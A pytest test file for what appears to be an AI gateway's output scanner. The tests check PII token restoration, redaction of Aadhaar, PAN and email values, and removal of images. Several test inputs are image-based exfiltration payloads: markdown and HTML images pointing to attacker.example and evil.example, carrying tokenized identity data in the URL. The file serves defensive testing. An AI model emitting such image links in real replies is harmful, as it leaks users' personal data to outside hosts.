import random

import pytest

from gateway.output_scan import IMAGE_REMOVED, OutputPolicy, scan_and_restore
from gateway.vault import TokenVault
from tests import synth


@pytest.fixture
def rng():
    return random.Random(20261106)


@pytest.fixture
def vault():
    return TokenVault()


def scan(text, vault, sid="s", policy=None):
    return scan_and_restore(text, sid, vault, policy)


# ------------------------------------------------------------ restoring tokens
def test_clean_reply_unchanged(vault):
    r = scan("Your loan is under review.", vault)
    assert r.text == "Your loan is under review." and not r.flagged


def test_own_tokens_are_restored_in_plain_text(vault):
    t = vault.tokenize("s", "PAN", "ABCPK1234D")
    r = scan(f"Your PAN {t} is verified.", vault)
    assert r.text == "Your PAN ABCPK1234D is verified." and not r.flagged


def test_tokens_inside_urls_are_not_restored(vault):
    t = vault.tokenize("s", "AADHAAR", "2384 1295 6108")
    r = scan(f"See [details](https://example.test/view?id={t}) for {t}.", vault)
    assert "2384" not in r.text.split("for")[0]               # URL part untouched
    assert f"https://example.test/view?id={t}" in r.text
    assert r.text.endswith("for 2384 1295 6108.")             # plain text part restored


def test_bare_and_www_urls_with_tokens_are_not_restored(vault):
    t = vault.tokenize("s", "PAN", "ABCPK1234D")
    for url in (f"https://a.test/?p={t}", f"www.a.test/?p={t}", f"http://a.test/{t}/x"):
        r = scan(f"go to {url} now", vault)
        assert "ABCPK1234D" not in r.text, url


# ------------------------------------------------------------ images
def test_markdown_image_removed_even_without_pii(vault):
    r = scan("Here ![logo](https://cdn.example/logo.png) done", vault)
    assert r.text == f"Here {IMAGE_REMOVED} done" and r.images_removed == 1


def test_image_with_token_in_url_is_removed_not_restored(vault):
    t = vault.tokenize("s", "AADHAAR", "2384 1295 6108")
    r = scan(f"ok ![x](https://attacker.example/c?d={t})", vault)
    assert "2384" not in r.text and "attacker" not in r.text and r.images_removed == 1


def test_html_image_removed(vault):
    r = scan('hi <img src="https://attacker.example/p.gif?d=1"> bye', vault)
    assert "attacker" not in r.text and r.images_removed == 1


def test_html_image_with_token_inside_removed(vault):
    t = vault.tokenize("s", "AADHAAR", "2384 1295 6108")
    r = scan(f'<img src="https://attacker.example/p?d={t}"> x', vault)
    assert "attacker" not in r.text and "2384" not in r.text


def test_allowlisted_image_host_is_kept(vault):
    pol = OutputPolicy(allowed_image_hosts=frozenset({"cdn.bharatbank.example"}))
    keep = "![logo](https://cdn.bharatbank.example/logo.png)"
    r = scan(f"{keep} and ![x](https://evil.example/a.png)", vault, policy=pol)
    assert keep in r.text and "evil" not in r.text and r.images_removed == 1


def test_multiple_images_all_removed(vault):
    r = scan("![a](http://x.test/1) ![b](http://y.test/2)", vault)
    assert r.images_removed == 2 and "x.test" not in r.text and "y.test" not in r.text


# ------------------------------------------------------------ raw PII from the model
def test_raw_pii_in_reply_is_redacted(rng, vault):
    a, p = synth.aadhaar(rng), synth.pan(rng)
    r = scan(f"Records: aadhaar {synth.group(a)}, pan {p}.", vault)
    assert a not in r.text.replace(" ", "") and p not in r.text
    assert r.text == "Records: aadhaar [REDACTED_AADHAAR], pan [REDACTED_PAN]."
    assert r.redacted == {"AADHAAR": 1, "PAN": 1} and r.flagged


def test_raw_pii_without_keyword_is_still_redacted(rng, vault):
    p = synth.pan(rng)
    assert "[REDACTED_PAN]" in scan(f"here is {p} for you", vault).text


def test_raw_value_that_is_the_users_own_is_also_redacted(rng, vault):
    # The model only ever received a token; a raw copy in the reply did not come from the user.
    a = synth.aadhaar(rng)
    vault.tokenize("s", "AADHAAR", a)
    assert "[REDACTED_AADHAAR]" in scan(f"aadhaar {a}", vault).text


def test_allowed_types_and_values_pass(rng, vault):
    ifsc = synth.ifsc(rng)
    pol = OutputPolicy(allow_values=frozenset({"support@bharatbank.example"}))
    r = scan(f"IFSC {ifsc}; write to Support@BharatBank.example", vault, policy=pol)
    assert ifsc in r.text and "Support@BharatBank.example" in r.text and not r.flagged


def test_other_email_is_redacted(vault):
    assert "[REDACTED_EMAIL]" in scan("mail rahul.k@gmail.com", vault).text


def test_restored_values_are_not_rescanned(rng, vault):
    a = synth.aadhaar(rng)
    t = vault.tokenize("s", "AADHAAR", a)
    r = scan(f"Your id is {t}", vault)
    assert r.text == f"Your id is {a}" and not r.redacted


# ------------------------------------------------------------ foreign tokens
def test_foreign_tokens_counted_and_never_restored(vault):
    vault.tokenize("alice", "PAN", "ABCPK1234D")
    r = scan("pan <PAN_1> and <AADHAAR_7>", vault, sid="bob")
    assert r.text == "pan <PAN_1> and <AADHAAR_7>"
    assert r.foreign_tokens == 2 and r.flagged


def test_own_tokens_are_not_foreign(vault):
    t = vault.tokenize("s", "PAN", "ABCPK1234D")
    assert scan(t, vault).foreign_tokens == 0


def test_order_images_removed_before_entities_so_offsets_stay_valid(rng, vault):
    a = synth.aadhaar(rng)
    r = scan(f"![x](https://e.test/a.png) aadhaar {a} ![y](https://e.test/b.png)", vault)
    assert r.text == f"{IMAGE_REMOVED} aadhaar [REDACTED_AADHAAR] {IMAGE_REMOVED}"
